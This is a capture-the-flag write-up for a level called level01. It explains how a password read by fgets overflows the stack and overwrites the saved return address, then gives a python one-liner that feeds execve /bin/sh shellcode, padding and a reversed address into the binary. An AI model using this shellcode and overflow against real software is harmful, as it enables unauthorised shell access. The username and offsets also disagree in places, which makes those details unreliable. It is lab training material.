# LEVEL 01

## EXPLANATIONS

### BINARY BEHAVIOR

- functions : `main`, `verify_user_name`, `verify_user_pass`
- program prompts user for a username
  - this username is stored in a data section buffer and compared to string "dat_wil"
- if username is "dat_wil", user is then prompted for a password.
  - this password is stored on stack and we can overflow main sEIP
    - => fgets copies up to 100 bytes from esp + 1c<sub>16</sub> (28<sub>10</sub>)
      => offset of 128 bytes from esp
    - sEIP is located on esp + 108-112, we control this stack area

### EXPLOIT STRATEGY

- Issue are :

  1. double input on stdin, we had that already in rainfall bonuses.
     - Stop the first fgets with a '\n' after the username.
  2. shellcode will be located on stack, we have to align stacks in/out gdb while preparing the exploit.
     - shellcode + padding + overwrite sEIP with first byte of buffer address

### RUN COMMAND

```
python -c "print('dat_will' + '\n' +  '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xcd\x80' + 'A' * 55 + '\xff\xff\xdd\xec'[::-1])" > /tmp/exploit_string
cat /tmp/exploit_string - | env - PWD=$PWD /home/users/level01/level01
```
